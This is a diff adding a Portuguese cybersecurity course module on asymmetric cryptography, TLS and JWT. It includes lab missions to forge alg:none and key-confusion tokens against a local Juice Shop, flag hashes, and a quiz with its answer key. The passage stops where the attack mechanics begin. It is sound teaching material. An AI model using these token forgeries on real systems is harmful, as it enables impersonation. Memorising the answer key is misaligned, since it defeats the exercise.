@@ -1,0 +1,1000 @@
+---
+slug: criptografia-assimetrica-e-tls
+track: trilha-3
+title: "Criptografia assimétrica e TLS"
+prerequisites: [hashing-senhas-e-quebra, criptografia-simetrica]
+lab: juice-shop
+tasks:
+  - slug: missao-1-jwt-sem-assinatura
+    title: "Missão 1 — O token sem assinatura"
+    type: flag
+    prompt: "Decodifique o token legítimo do admin, forje um token com alg:none que vira o usuário jwtn3d@juice-sh.op e cole a flag no formato FLAG{none-<hash de senha do admin>}."
+    hint: "O header manda no algoritmo. Se você disser alg:none e deixar a assinatura vazia, um servidor que confia no campo alg não verifica nada. A segunda metade da flag sai do payload do token legítimo que você decodificou."
+    flag:
+      hash: "scrypt$16384$8$1$6fbd25359ceeafbd18a2afb33e9f46a3266421edba6d6f2bf5164d3486e69827"
+      salt: "f50e2669e195a8282b25ca886e3d015a"
+  - slug: missao-2-confusao-de-chaves
+    title: "Missão 2 — A chave pública virada segredo"
+    type: flag
+    prompt: "Forje um token HS256 que vira rsa_lord@juice-sh.op usando a chave pública do servidor como segredo HMAC, e cole a flag FLAG{HS256-<sha256 do arquivo da chave>}."
+    hint: "O servidor espera RS256 e verifica com a chave pública. Se você assinar com HS256 usando essa mesma chave pública como segredo, o servidor confunde os papéis. O app serve a chave em /encryptionkeys/jwt.pub — baixe-a e repare se tem (ou não) quebra de linha no fim."
+    flag:
+      hash: "scrypt$16384$8$1$89988cf41917795fa420b5930ff35702a5450233ec8a8a81a610c5cd782884dc"
+      salt: "130263dd10e0f94b6b17b05b7cde492b"
+  - slug: quiz-final
+    title: "Quiz — Criptografia assimétrica e TLS"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que a criptografia simétrica (AES do 3.3), sozinha, não resolve a comunicação segura na internet?"
+        options:
+          - "Porque o AES é lento demais para a web"
+          - "Porque os dois lados precisam combinar a mesma chave antes, e num canal público não há como fazer isso em segredo"
+          - "Porque o AES não tem integridade"
+          - "Porque o AES só funciona dentro de uma rede local"
+        answer: 1
+        explanation: "O problema é a troca de chave (key exchange): com uma cifra simétrica, as duas pontas precisam da mesma chave secreta, mas dois computadores que nunca se falaram não têm por onde combiná-la sem que um bisbilhoteiro no caminho a veja. A assimétrica e o Diffie-Hellman existem justamente para resolver isso. O AES é rápido; o impasse é anterior a ele."
+      - question: "Numa troca de chaves Diffie-Hellman, o que trafega pela rede?"
+        options:
+          - "A chave secreta final, cifrada com AES"
+          - "Os valores públicos de cada lado; o segredo compartilhado é calculado nas pontas e nunca é transmitido"
+          - "As chaves privadas de cada lado"
+          - "Nada: o DH não usa a rede"
+        answer: 1
+        explanation: "Cada lado manda só o seu valor público (g^a e g^b). O segredo compartilhado nasce do cruzamento desses valores com o expoente privado de cada um e dá o mesmo resultado nas duas pontas, sem nunca viajar. Quem escuta vê os públicos e o g e o p, mas não consegue voltar aos expoentes (o problema do logaritmo discreto)."
+      - question: "RSA-2048 e ECC-256 oferecem, segundo o NIST, segurança parecida (nível de 112–128 bits). Por que usar curvas elípticas?"
+        options:
+          - "Porque o ECC é inquebrável e o RSA não"
+          - "Porque chaves muito menores dão a mesma força: menos dados para trafegar e processar, o que importa em TLS e em dispositivos pequenos"
+          - "Porque o ECC não precisa de chave privada"
+          - "Porque o RSA foi proibido"
+        answer: 1
+        explanation: "O NIST SP 800-57 põe lado a lado: para ~128 bits de segurança, RSA pede 3072 bits de chave e o ECC pede 256. A matemática das curvas resiste melhor por bit, então chaves menores bastam — handshakes mais leves e mais rápidos. Nenhum dos dois é inquebrável; os dois caem para um computador quântico grande (assunto do 3.5)."
+      - question: "Você cifra uma mensagem com a chave PÚBLICA de alguém. Quem consegue decifrar?"
+        options:
+          - "Qualquer um que tenha a chave pública"
+          - "Só quem tem a chave privada correspondente"
+          - "Você mesmo, com a pública"
+          - "Ninguém: cifrar com a pública é irreversível"
+        answer: 1
+        explanation: "No par de chaves, o que uma fecha só a outra abre. Cifrar com a pública dá confidencialidade: só o dono da privada lê. Cuidado com o espelho: assinar é o contrário — usa a privada do autor, e qualquer um verifica com a pública dele. Trocar esses papéis é exatamente a falha da Missão 2."
+      - question: "O que o certificado TLS de um site prova ao seu navegador?"
+        options:
+          - "Que o site é honesto e não tem vírus"
+          - "Que a chave pública ali dentro pertence mesmo àquele domínio, porque uma autoridade certificadora em que o navegador confia assinou essa associação"
+          - "Que a conexão é rápida"
+          - "Que o site foi auditado pelo governo"
+        answer: 1
+        explanation: "O certificado é uma afirmação assinada: 'esta chave pública é do domínio exemplo.com.br'. Quem assina é uma CA cuja chave já vem instalada no navegador (a raiz da confiança). O navegador confere a cadeia de assinaturas, o domínio e a validade. Ele não diz nada sobre a idoneidade do dono do site — só liga a chave ao nome."
+      - question: "Um JWT tem três partes em Base64url: header.payload.assinatura. Onde está a proteção contra adulteração?"
+        options:
+          - "No Base64url, que embaralha os dados"
+          - "Só na assinatura; header e payload são legíveis e editáveis por qualquer um, e só a assinatura (feita com uma chave) denuncia a alteração"
+          - "No header, que esconde o algoritmo"
+          - "No payload, que é cifrado"
+        answer: 1
+        explanation: "Base64url é encoding, não cifra (você viu isso no 3.1): header e payload decodificam num comando. O que impede trocar \"role\":\"user\" por \"admin\" é a assinatura, calculada sobre header.payload com uma chave que o atacante não tem. Se o servidor verifica mal essa assinatura, o token inteiro deixa de valer — foi o que você explorou no lab."
+      - question: "Por que o ataque alg:none funciona em um servidor vulnerável?"
+        options:
+          - "Porque none é um algoritmo de cifra muito forte"
+          - "Porque o servidor confia no campo alg do header (que o atacante controla) e, vendo none, conclui que não há assinatura a verificar"
+          - "Porque o JWT sem assinatura é sempre rejeitado"
+          - "Porque none quebra o Base64url"
+        answer: 1
+        explanation: "O alg fica no header, que é parte não autenticada e sob controle do atacante. A biblioteca ingênua lê alg:none e pula a verificação, aceitando um token com assinatura vazia e payload à vontade. A defesa é o servidor fixar o algoritmo esperado e nunca deixar o token escolher — jamais aceitar none."
+      - question: "Na confusão de chaves RS256 → HS256, por que a chave pública do servidor vira a arma do atacante?"
+        options:
+          - "Porque a chave pública é secreta"
+          - "Porque o servidor verifica RS256 com a chave pública, mas, enganado para usar HS256, trata essa mesma chave pública (que é conhecida) como o segredo do HMAC — e o atacante também a conhece"
+          - "Porque a chave pública decifra a privada"
+          - "Porque HS256 é mais forte que RS256"
+        answer: 1
+        explanation: "No RS256 (assimétrico), verificar usa a chave pública — de propósito divulgável. No HS256 (simétrico), a mesma função de verificação passa a usar a 'chave' como segredo HMAC compartilhado. Se o código não fixa o algoritmo, o atacante manda HS256 e assina com a chave pública; o servidor valida com essa chave e aceita. A falha é deixar o token escolher a família do algoritmo."
+      - question: "O TLS 1.3 usa chaves efêmeras (ECDHE) a cada sessão, descartadas depois. Que propriedade isso garante?"
+        options:
+          - "Compressão dos dados"
+          - "Forward secrecy: se a chave privada de longo prazo do servidor vazar amanhã, o tráfego gravado ontem continua ilegível, porque a chave daquela sessão não existe mais"
+          - "Que o certificado nunca expira"
+          - "Autenticação do cliente"
+        answer: 1
+        explanation: "Forward secrecy (sigilo adiante) separa a chave que autentica o servidor (de longo prazo) da chave que cifra cada sessão (efêmera, jogada fora). Quem gravou o tráfego cifrado e depois rouba a chave de longo prazo não consegue decifrar o passado. Por isso o TLS 1.3 removeu a troca de chave por RSA puro, que não tinha essa proteção."
+      - question: "Um sistema guarda senhas e precisa provar a um TERCEIRO quem assinou um documento. HMAC resolve o não repúdio?"
+        options:
+          - "Sim, HMAC e assinatura são a mesma coisa"
+          - "Não: no HMAC os dois lados têm a mesma chave, então qualquer um dos dois pode ter gerado a tag; só a assinatura digital, com chave privada exclusiva do autor, dá não repúdio"
+          - "Sim, se a chave for de 256 bits"
+          - "Não, porque HMAC não tem integridade"
+        answer: 1
+        explanation: "Você viu no 3.1 que HMAC dá integridade e autenticidade entre quem compartilha a chave. Mas, como os dois têm a mesma chave, nenhum dos dois pode provar a um terceiro que foi o outro: falta o não repúdio. A assinatura digital resolve porque só o autor tem a privada, e o mundo todo confere com a pública."
+glossary:
+  - term: key exchange
+    definition: "Troca de chaves: o problema (e os métodos) de combinar uma chave secreta compartilhada entre duas partes usando um canal que pode estar sendo escutado. É o que a criptografia assimétrica resolve."
+  - term: RSA
+    definition: "Rivest–Shamir–Adleman (1977): o algoritmo assimétrico mais conhecido. Sua segurança vem da dificuldade de fatorar um número que é o produto de dois primos grandes. Serve para cifrar e para assinar."
+  - term: modular arithmetic
+    definition: "Aritmética modular: contas com o resto da divisão por um número (o módulo), como num relógio que volta a 1 depois do 12. É a base das contas de RSA e Diffie-Hellman."
+  - term: trapdoor function
+    definition: "Função com alçapão: fácil de calcular num sentido e inviável de inverter, a não ser que se conheça um segredo (a chave privada). É o coração do RSA: multiplicar primos é fácil; fatorar o produto, não."
+  - term: Diffie-Hellman
+    definition: "Diffie–Hellman (1976): método que deixa duas partes derivarem o mesmo segredo compartilhado trocando só valores públicos, sem nunca transmitir o segredo. Base da troca de chaves do TLS moderno."
+  - term: discrete logarithm problem
+    definition: "Problema do logaritmo discreto: dado g e g^a mod p, recuperar a. É inviável para números grandes e é o que torna o Diffie-Hellman seguro."
+  - term: elliptic-curve cryptography
+    definition: "Criptografia de curva elíptica (ECC): família de algoritmos assimétricos baseados em pontos de uma curva. Dá a mesma segurança do RSA com chaves muito menores (ECC-256 ≈ RSA-3072)."
+  - term: ECDHE
+    definition: "Elliptic Curve Diffie-Hellman Ephemeral: a troca de chaves Diffie-Hellman sobre curva elíptica, com chaves efêmeras (uma por sessão). É o que o TLS 1.3 usa e o que dá forward secrecy."
+  - term: certificate
+    definition: "Certificado digital: um documento assinado por uma autoridade que liga uma chave pública a uma identidade (um domínio, por exemplo). É o que o servidor apresenta no handshake TLS."
+  - term: X.509
+    definition: "X.509: o formato padrão dos certificados usados em TLS. Define os campos (dono, emissor, validade, chave pública, extensões) e como a assinatura da autoridade é aposta."
+  - term: certificate authority
+    definition: "Autoridade certificadora (CA): entidade em que navegadores e sistemas confiam por padrão e que assina certificados, atestando que uma chave pública pertence mesmo a um domínio."
+  - term: public key infrastructure
+    definition: "Infraestrutura de chave pública (PKI): o conjunto de CAs, certificados, políticas e listas de revogação que faz a confiança em chaves públicas funcionar em escala, como na web."
+  - term: root of trust
+    definition: "Âncora de confiança: o certificado raiz, autoassinado, cuja chave pública já vem instalada no dispositivo. Toda cadeia de certificados termina numa raiz em que você confia de saída."
+  - term: certificate chain
+    definition: "Cadeia de certificados: a sequência raiz → intermediária → folha em que cada nível assina o seguinte. O navegador valida a folha subindo a cadeia até uma raiz confiável."
+  - term: TLS handshake
+    definition: "Aperto de mão do TLS: a fase inicial da conexão em que cliente e servidor negociam parâmetros, trocam a chave (ECDHE), autenticam o servidor (certificado) e derivam a chave de sessão, antes dos dados."
+  - term: session key
+    definition: "Chave de sessão: a chave simétrica (ex.: do AES-GCM) derivada no handshake e usada só naquela conexão para cifrar os dados. Descartada no fim; é efêmera."
+  - term: Bearer token
+    definition: "Token ao portador: credencial que dá acesso a quem a apresenta, sem outra prova (como uma passagem). JWT em APIs costuma viajar no cabeçalho Authorization: Bearer <token>."
+  - term: claims
+    definition: "Claims: as afirmações dentro do payload de um JWT (quem é o usuário, seu papel, a validade). O servidor age com base nelas, então uma claim adulterada em token mal verificado vira acesso indevido."
+  - term: key confusion
+    definition: "Confusão de chaves (algorithm confusion): ataque a JWT em que o servidor espera um algoritmo assimétrico (RS256) mas é enganado a verificar um token simétrico (HS256), usando a chave pública como se fosse o segredo HMAC."
+  - term: mutual TLS
+    definition: "TLS mútuo (mTLS): variação do TLS em que não só o servidor, mas também o cliente apresenta um certificado, de modo que os dois lados se autenticam. Comum entre serviços internos."
+  - term: certificate revocation
+    definition: "Revogação de certificado: declarar um certificado inválido antes de expirar (chave comprometida, emissão indevida), por listas (CRL) ou consulta online (OCSP). Foi o que se fez em massa no caso DigiNotar."
+---
+
+import handshake from "./img/tls-handshake.svg";
+import parDeChaves from "./img/par-de-chaves.svg";
+import jwtAnatomia from "./img/jwt-anatomia.svg";
+import cadeiaDeConfianca from "./img/cadeia-de-confianca.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No Módulo 2.6 você abriu o Wireshark, capturou o seu próprio login e leu a
+senha em texto claro, viajando pela rede sem nenhuma proteção. A lição foi
+direta: sem <GlossaryTerm term="TLS">TLS</GlossaryTerm>, qualquer um no caminho
+lê tudo. Mas isso abre uma pergunta que a <GlossaryTerm term="symmetric encryption">criptografia
+simétrica</GlossaryTerm> do 3.3 não responde sozinha: para cifrar a conversa
+com AES, os dois lados precisam da
+**mesma chave** — e como o seu navegador e um servidor que ele nunca viu
+combinam uma chave secreta na frente de todo mundo, inclusive de quem está
+escutando? Responder a isso é o que a humanidade levou do fim dos anos 1970
+para resolver, e é o coração deste módulo.
+
+A resposta tem um nome: <GlossaryTerm term="asymmetric encryption">criptografia
+assimétrica</GlossaryTerm> (*asymmetric encryption*, um par de chaves em que o
+que uma fecha só a outra abre). Dela saem a troca de chaves do TLS, as
+assinaturas digitais, os <GlossaryTerm term="certificate">certificados</GlossaryTerm>
+que fazem o cadeado do navegador fechar e os <GlossaryTerm term="JWT">JWT</GlossaryTerm>
+que autenticam você nas aplicações modernas. E, como todo mecanismo, ela quebra
+quando é mal usada. No laboratório, você vai forjar tokens de autenticação de
+duas formas diferentes contra o OWASP Juice Shop — virando usuários que nem
+existem — explorando exatamente os erros que aparecem em produção.
+
+**Ao final, você vai saber:**
+
+- explicar o problema da troca de chaves e como <GlossaryTerm term="Diffie-Hellman">Diffie-Hellman</GlossaryTerm>
+  e o RSA o resolvem, com um exemplo numérico que você faz à mão;
+- distinguir os dois usos de um par de chaves (cifrar para alguém vs. assinar)
+  e nunca mais trocar os papéis da chave pública e da privada;
+- ler um certificado e seguir a <GlossaryTerm term="certificate chain">cadeia de
+  confiança</GlossaryTerm> até a raiz, entendendo o que o navegador valida;
+- descrever o <GlossaryTerm term="TLS handshake">handshake do TLS 1.3</GlossaryTerm>
+  e por que ele combina assimétrica, assinatura e simétrica;
+- decodificar um JWT, reconhecer um token fraco e forjá-lo por `alg:none` e por
+  <GlossaryTerm term="key confusion">confusão de chaves</GlossaryTerm>;
+- dizer, para cada falha, exatamente como o servidor deveria se defender.
+
+**Pré-requisitos:**
+
+- **3.2 — Hashing, senhas e quebra de hashes:** a assinatura digital começa com
+  um hash; e o payload do token do lab guarda um hash de senha que você
+  reconhece do 3.2.
+- **3.3 — Criptografia simétrica:** AES, os modos e o AES-GCM; a assimétrica não
+  substitui a simétrica — ela entrega a chave que a simétrica vai usar.
+
+Daqui também voltam, de módulos anteriores: o Base64url e o
+<GlossaryTerm term="HMAC">HMAC</GlossaryTerm> do 3.1, o
+<GlossaryTerm term="certificate pinning">certificate pinning</GlossaryTerm> e o
+certificado do Burp (2.5), a <GlossaryTerm term="forward secrecy">forward
+secrecy</GlossaryTerm> que o Wireshark não conseguiu furar (2.6) e o
+<GlossaryTerm term="TLS handshake">handshake</GlossaryTerm> que você já tinha
+visto por fora nas redes (0.2).
+
+**Tempo estimado:** de 4 a 6 horas, incluindo as duas missões no lab.
+
+<Callout variant="ethics">
+Forjar um token de autenticação é, na prática, se passar por outra pessoa num
+sistema. O que separa o exercício do crime é a **autorização**: aqui o alvo é o
+Juice Shop do seu laboratório local, isolado e sem internet, feito de propósito
+para isso. Fazer o mesmo contra um sistema real sem autorização por escrito é
+invasão de dispositivo (Lei 12.737/2012, do 1.4) e fraude. A técnica é a mesma;
+a legitimidade, não.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O impasse que a simétrica não resolve
+
+A criptografia simétrica do 3.3 é rápida e forte, mas tem um calcanhar: as duas
+pontas precisam da **mesma chave secreta** antes de trocar qualquer dado. Entre
+duas pessoas que podem se encontrar, tudo bem — combinam a chave pessoalmente.
+Na internet, não há esse encontro: o seu navegador fala pela primeira vez com um
+servidor do outro lado do mundo, por um caminho cheio de roteadores, provedores
+e redes de Wi-Fi que você não controla. Mandar a chave por esse canal é entregá-la
+a quem está escutando (o atacante do modelo *ciphertext-only* do 3.1, agora
+ligado no cabo).
+
+Há ainda um segundo problema, de escala. Se *n* pessoas querem conversar duas a
+duas com chaves simétricas, são *n·(n−1)/2* chaves para distribuir e guardar —
+para dez pessoas, 45 chaves; para mil, quase meio milhão. A simétrica não
+escala para uma rede aberta como a web. A <GlossaryTerm term="key exchange">troca
+de chaves</GlossaryTerm> (*key exchange*: como combinar uma chave secreta por um
+canal escutado) é o problema central que faltava resolver — e foi resolvido em
+1976, de duas formas que vamos ver: derivando a chave em público
+(Diffie-Hellman) e usando um par de chaves (RSA).
+
+### 2.2 A ideia da chave pública
+
+A sacada da assimétrica é abandonar a chave única. Cada pessoa passa a ter um
+**par**: uma <GlossaryTerm term="public-key cryptography">chave pública</GlossaryTerm>,
+que pode ser divulgada a todos, e uma chave privada, que fica só com ela. As duas
+são ligadas por matemática, de um jeito especial: **o que uma fecha, só a outra
+desfaz**, e ter a pública não permite descobrir a privada.
+
+A analogia clássica é o cadeado. Imagine que você distribui cadeados abertos (a
+chave pública) e guarda só com você a chavinha que os abre (a privada). Qualquer
+um pode trancar uma caixa com o seu cadeado e mandá-la; só você abre. Repare que
+quem trancou **não consegue reabrir** — fechar e abrir são operações
+diferentes. É isso que quebra o impasse da seção anterior: não é preciso combinar
+segredo nenhum antes. Você publica o cadeado; o mundo tranca caixas para você.
+
+Esse par serve a **dois** propósitos opostos, e confundi-los é a raiz de metade
+dos erros de criptografia (e da Missão 2 do lab):
+
+<Figure
+  src={parDeChaves}
+  alt="À esquerda, confidencialidade: quem envia cifra com a chave pública do destinatário, e só o destinatário decifra com a privada. À direita, autenticidade: o dono assina com a privada e qualquer um verifica com a pública. No rodapé, a regra: a pública se divulga, a privada nunca; cifrar usa a pública de quem recebe, assinar usa a privada de quem envia."
+  caption="Os dois usos de um par de chaves. Cifrar para alguém usa a chave pública de quem recebe (confidencialidade). Assinar usa a chave privada de quem envia (autenticidade). Trocar os papéis é a falha da Missão 2."
+/>
+
+### 2.3 RSA por dentro, com números que você confere à mão
+
+O <GlossaryTerm term="RSA">RSA</GlossaryTerm> (de Rivest, Shamir e Adleman, 1977)
+é o algoritmo assimétrico mais conhecido. A segurança dele é uma
+<GlossaryTerm term="trapdoor function">função com alçapão</GlossaryTerm>:
+multiplicar dois números primos grandes é trivial, mas **fatorar** o produto de
+volta nos dois primos é inviável quando eles têm centenas de dígitos. Multiplicar
+é a porta aberta; fatorar é a porta trancada — e a chave privada é o alçapão que
+atalha.
+
+Tudo em RSA é <GlossaryTerm term="modular arithmetic">aritmética modular</GlossaryTerm>
+(contas com o resto da divisão por um número, como as horas que voltam ao 1 depois
+do 12). Vamos gerar um par com primos minúsculos, só para ver a máquina girar
+(numa chave real os primos têm milhares de bits):
+
+1. Escolha dois primos: `p = 5`, `q = 11`.
+2. O módulo é `n = p·q = 55`. Ele vai nas duas chaves, pública e privada.
+3. Calcule `φ = (p−1)·(q−1) = 4·10 = 40`.
+4. Escolha o expoente público `e = 3` (primo com φ). A **chave pública** é `(n=55, e=3)`.
+5. Ache o `d` tal que `e·d ≡ 1 (mod φ)`: aqui `d = 27`, pois `3·27 = 81 = 2·40 + 1`. A **chave privada** é `(n=55, d=27)`.
+
+Cifrar a mensagem `m = 7` com a pública é `c = m^e mod n`:
+
+```console
+$ python3 -c "print(pow(7, 3, 55))"
+13
+```
+
+Decifrar `c = 13` com a privada é `m = c^d mod n`:
+
+```console
+$ python3 -c "print(pow(13, 27, 55))"
+7
+```
+
+Voltou o `7`. Quem só tem a pública `(55, 3)` e o cifrado `13` precisaria achar o
+`d` — e, para isso, fatorar o `55` em `5·11`. Com dois dígitos é imediato; com os
+617 dígitos de uma chave de 2048 bits, nenhuma fazenda de computadores do planeta
+faz isso em tempo humano. **Essa** é a força do RSA: não um embaralhamento
+esperto, mas um problema matemático que ninguém sabe resolver rápido.
+
+<Callout variant="warning" title="Cifrar não é assinar">
+Repare na simetria do exemplo: cifrar usou `e` (a pública) e decifrar usou `d`
+(a privada). **Assinar** é o inverso: aplicar a privada primeiro (`d`) e deixar
+qualquer um conferir com a pública (`e`). O mesmo par, duas direções. Guardar
+essa diferença é o que vai te salvar na Missão 2.
+</Callout>
+
+### 2.4 Diffie-Hellman: o segredo combinado em público
+
+O RSA resolve a troca de chaves "cifrando" uma chave com a pública do outro. Há
+um caminho ainda mais elegante, anterior ao RSA: o <GlossaryTerm term="Diffie-Hellman">Diffie-Hellman</GlossaryTerm>
+(1976), que deixa os dois lados **derivarem o mesmo segredo** sem nunca transmiti-lo.
+
+A analogia é a das tintas. Os dois combinam em público uma cor base (digamos,
+amarelo). Cada um escolhe uma cor secreta e a mistura com o amarelo; as misturas
+são trocadas abertamente. No fim, cada um junta a cor secreta **sua** à mistura
+**do outro**, e os dois chegam exatamente à mesma cor final. Quem viu as misturas
+trafegarem não consegue "separar" as tintas para achar as cores secretas.
+
+Em números (exemplo pequeno, conferível): combina-se em público `p = 23` e
+`g = 5`. A ponta A sorteia o segredo `a = 6`; a ponta B sorteia `b = 15`. Cada
+uma manda o seu valor público `g^segredo mod p`:
+
+```console
+$ python3 -c "print(pow(5, 6, 23))"   # A manda 8
+8
+$ python3 -c "print(pow(5, 15, 23))"  # B manda 19
+19
+```
+
+Agora cada uma eleva o valor **recebido** ao próprio segredo:
+
+```console
+$ python3 -c "print(pow(19, 6, 23))"  # A: 19^a
+2
+$ python3 -c "print(pow(8, 15, 23))"  # B: 8^b
+2
+```
+
+Os dois chegaram ao `2` sem jamais enviá-lo. Quem escutou viu `p`, `g`, `8` e
+`19`, e para achar o segredo teria de resolver o <GlossaryTerm term="discrete logarithm problem">problema
+do logaritmo discreto</GlossaryTerm> (dado `g` e `g^a mod p`, descobrir `a`) —
+inviável para números grandes. Quando os segredos `a` e `b` são sorteados a cada
+conexão e jogados fora depois, temos chaves **efêmeras**: é o
+<GlossaryTerm term="ECDHE">ECDHE</GlossaryTerm> (a versão sobre curva elíptica,
+que o TLS 1.3 usa) e a origem da <GlossaryTerm term="forward secrecy">forward
+secrecy</GlossaryTerm> — a chave de hoje não existe mais amanhã.
+
+### 2.5 Curvas elípticas: a mesma força com chaves menores
+
+RSA e Diffie-Hellman clássicos precisam de chaves grandes (2048, 3072 bits) porque
+fatorar e o logaritmo discreto, embora difíceis, têm atalhos conhecidos que
+encurtam a busca. A <GlossaryTerm term="elliptic-curve cryptography">criptografia
+de curva elíptica</GlossaryTerm> (*elliptic-curve cryptography*, ECC) troca a
+aritmética de inteiros pela de pontos de uma curva, onde o problema análogo é mais
+duro por bit — então chaves bem menores dão a mesma segurança.
+
+Quanto menores? O NIST publica a tabela de equivalência. Para o nível de **128
+bits** de segurança (o mesmo do AES-128), são necessários:
+
+| Família | Tamanho de chave para ~128 bits |
+|---|---|
+| Simétrica (AES) | 128 bits |
+| RSA / Diffie-Hellman | 3072 bits |
+| Curva elíptica (ECC) | 256 bits |
+
+Uma chave ECC de 256 bits equivale a uma RSA de 3072. Isso significa handshakes
+mais leves, menos dados para trafegar e contas mais rápidas — o que importa num
+servidor que atende milhões de conexões e num celular com bateria. Por isso o TLS
+moderno prefere curvas (X25519, P-256). O ponto a fixar: **tamanho de chave só se
+compara dentro da mesma família**. 256 bits de ECC são fortes; 256 bits de RSA
+seriam quebrados num instante.
+
+### 2.6 Assinatura digital: integridade e autoria com chave pública
+
+No 3.1 você viu que um hash prova integridade mas não autoria, e que o HMAC
+acrescenta autoria para quem compartilha uma chave — sem dar **não repúdio**,
+porque os dois lados têm a mesma chave. A <GlossaryTerm term="digital signature">assinatura
+digital</GlossaryTerm> fecha essa lacuna usando o par de chaves.
+
+Assinar é: calcular o hash da mensagem (SHA-256, por exemplo) e aplicar a **chave
+privada** a esse hash. Qualquer pessoa, de posse da **chave pública** do autor,
+refaz o hash da mensagem e confere contra a assinatura. Se bate, duas coisas
+ficam provadas de uma vez: a mensagem não mudou (integridade) e só pode ter vindo
+de quem tem a privada (autenticidade **com** não repúdio, porque ninguém mais tem
+aquela chave). É o que carimba uma atualização de software, um documento
+eletrônico e — o que nos interessa aqui — a terceira parte de um JWT.
+
+### 2.7 Certificados e a cadeia de confiança
+
+Falta um elo. A assinatura prova que a mensagem veio do dono de uma chave
+privada; mas como você sabe que **aquela chave pública** é mesmo do
+`banco.com.br`, e não de um impostor que publicou a própria chave com esse nome?
+É o problema que os <GlossaryTerm term="certificate">certificados</GlossaryTerm>
+resolvem.
+
+Um certificado (no formato <GlossaryTerm term="X.509">X.509</GlossaryTerm>) é uma
+afirmação assinada: "a chave pública tal pertence ao domínio tal, válida de tal a
+tal data". Quem assina essa afirmação é uma <GlossaryTerm term="certificate authority">autoridade
+certificadora</GlossaryTerm> (*certificate authority*, CA). E por que você confia
+na CA? Porque a chave pública dela — o certificado **raiz** — já vem instalada no
+seu navegador e sistema operacional, de fábrica. Essa raiz é a
+<GlossaryTerm term="root of trust">âncora de confiança</GlossaryTerm>: o ponto de
+partida que você aceita sem perguntar.
+
+Na prática a raiz fica guardada offline e assina poucas CAs **intermediárias**,
+que por sua vez assinam os certificados **folha** dos sites. Forma-se a
+<GlossaryTerm term="certificate chain">cadeia de certificados</GlossaryTerm>, e o
+navegador a valida de baixo para cima. Tudo isso — CAs, certificados, políticas e
+listas de revogação — é a <GlossaryTerm term="public key infrastructure">infraestrutura
+de chave pública</GlossaryTerm> (PKI) que sustenta a confiança na web.
+
+<Figure
+  src={cadeiaDeConfianca}
+  alt="Três certificados encadeados: a raiz autoassinada (já instalada no navegador) assina a intermediária, que assina a folha emitida para exemplo.com.br. O navegador valida de baixo para cima, conferindo a assinatura de cada nível com a chave pública do nível acima, o domínio e a validade. À direita, o aviso de que o roubo da chave de uma CA (como no DigiNotar) permite emitir certificados falsos aceitos pelo navegador."
+  caption="A cadeia de confiança. O navegador confia na raiz de saída e sobe a cadeia conferindo cada assinatura. Se a chave de uma CA vaza, a confiança inteira cai — foi o caso DigiNotar da seção 4."
+/>
+
+### 2.8 Como o TLS junta tudo
+
+Agora as peças se encaixam. Quando você acessa um site `https://`, o
+<GlossaryTerm term="TLS handshake">handshake do TLS</GlossaryTerm> faz, em poucos
+passos, o seguinte:
+
+1. **Troca de chave (assimétrica):** cliente e servidor fazem um ECDHE e derivam
+   um segredo compartilhado sem transmiti-lo (2.4).
+2. **Autenticação (assinatura + certificado):** o servidor manda o certificado
+   (com sua chave pública, assinada pela CA) e uma assinatura feita com sua chave
+   privada, provando que é dono daquela chave e daquele domínio (2.6, 2.7).
+3. **Dados (simétrica):** do segredo ECDHE nasce a <GlossaryTerm term="session key">chave
+   de sessão</GlossaryTerm>, e a conversa passa a ser cifrada com AES-GCM (3.3) —
+   rápido e autenticado.
+
+A assimétrica, que é lenta, aparece só no começo, para resolver o que só ela
+resolve (combinar a chave e provar a identidade). O grosso dos dados vai na
+simétrica, que é rápida. O <GlossaryTerm term="ECDHE">ECDHE</GlossaryTerm>
+efêmero garante a forward secrecy. Por isso o TLS 1.3 (RFC 8446, de agosto de
+2018) removeu de vez a antiga troca de chave por RSA puro, que não tinha essa
+proteção.
+
+<Figure
+  src={handshake}
+  alt="Diagrama de sequência do handshake TLS 1.3 entre Cliente e Servidor: ClientHello com key_share ECDHE, ServerHello com key_share, Certificate (chave pública assinada pela CA), CertificateVerify (assinatura com a chave privada do servidor), Finished e, por fim, dados da aplicação cifrados com AES-GCM. A legenda mapeia cada etapa à primitiva assimétrica ou simétrica e destaca a forward secrecy do key_share efêmero."
+  caption="O handshake do TLS 1.3. A assimétrica combina a chave (ECDHE) e prova a identidade (certificado + assinatura); a simétrica (AES-GCM) cifra os dados. A chave efêmera dá forward secrecy."
+/>
+
+### 2.9 JWT: assinatura levada a cabo nas aplicações
+
+O <GlossaryTerm term="JWT">JWT</GlossaryTerm> (JSON Web Token) é onde toda essa
+teoria encosta no seu dia a dia de quem testa aplicações. Depois do login, muitos
+sistemas devolvem um JWT que o navegador reapresenta a cada requisição, em geral
+como um <GlossaryTerm term="Bearer token">Bearer token</GlossaryTerm> no cabeçalho
+`Authorization`. O servidor confia nas <GlossaryTerm term="claims">claims</GlossaryTerm>
+(as afirmações do payload: quem é o usuário, seu papel) para decidir o que
+liberar.
+
+Um JWT tem três partes separadas por ponto, cada uma em Base64url (o encoding
+do 3.1): `header.payload.assinatura`. O header diz o algoritmo da assinatura; o
+payload traz as claims; a assinatura é calculada sobre `header.payload` com uma
+chave. A assinatura pode ser **simétrica** (HS256, um HMAC-SHA-256 com um segredo
+compartilhado) ou **assimétrica** (RS256, uma assinatura RSA com a privada do
+servidor, verificada com a pública).
+
+O ponto crucial, que você vai explorar no lab: **header e payload são só
+Base64url — legíveis e editáveis por qualquer um.** A única coisa que impede
+trocar `"role":"user"` por `"role":"admin"` é a assinatura. Se o servidor
+verifica a assinatura de forma frouxa, o token inteiro deixa de valer nada.
+
+<Figure
+  src={jwtAnatomia}
+  alt="Em cima, um JWT em três partes Base64url: header com o algoritmo, payload com as claims (e-mail e papel) e a assinatura, com a nota de que só a assinatura, feita com chave, protege. Embaixo, dois ataques: trocar o algoritmo para none e apagar a assinatura; e a confusão de chaves, assinando com HS256 usando a chave pública como segredo HMAC."
+  caption="A anatomia de um JWT e os dois pontos onde ele quebra: o alg:none (Missão 1) e a confusão de chaves RS256→HS256 (Missão 2)."
+/>
+
+## 3. Como o ataque funciona — a mecânica
+
+As falhas de JWT quase sempre nascem de um erro só: **deixar o token escolher
+como ele será verificado**. O campo `alg` fica no header, que é a parte não
+autenticada e sob controle de quem envia. Uma biblioteca ingênua lê o `alg` e
+obedece. A partir daí, três variantes clássicas.
+
+### 3.1 Variante A — `alg: none`
+
